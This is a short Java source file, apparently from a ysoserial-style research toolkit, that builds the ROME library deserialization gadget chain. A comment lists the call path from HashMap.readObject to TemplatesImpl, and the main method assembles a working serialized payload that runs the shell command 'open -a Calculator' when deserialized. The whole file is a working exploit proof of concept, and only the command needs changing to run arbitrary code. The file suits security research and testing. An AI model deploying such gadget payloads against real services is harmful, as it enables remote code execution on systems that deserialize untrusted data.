package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import java.util.HashMap;

/**
 * ROME 的 gadget
 *
 * Gadget chain:
 *      TemplatesImpl.getOutputProperties()
 *      NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 *      NativeMethodAccessorImpl.invoke(Object, Object[])
 *      DelegatingMethodAccessorImpl.invoke(Object, Object[])
 *      Method.invoke(Object, Object...)
 *      ToStringBean.toString(String)
 *      ToStringBean.toString()
 *      ObjectBean.toString()
 *      EqualsBean.beanHashCode()
 *      ObjectBean.hashCode()
 *      HashMap<K,V>.hash(Object)
 *      HashMap<K,V>.readObject(ObjectInputStream)
 */
@Dependencies("rome:rome:1.0")
public class ROME {
    public static void main(String[] args) throws Exception {
        Object o = Gadgets.createTemplatesImpl("open -a Calculator");
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        HashMap pocMap =  Gadgets.makeMap(root, root);

        PayloadRunner.run(pocMap);

    }
}
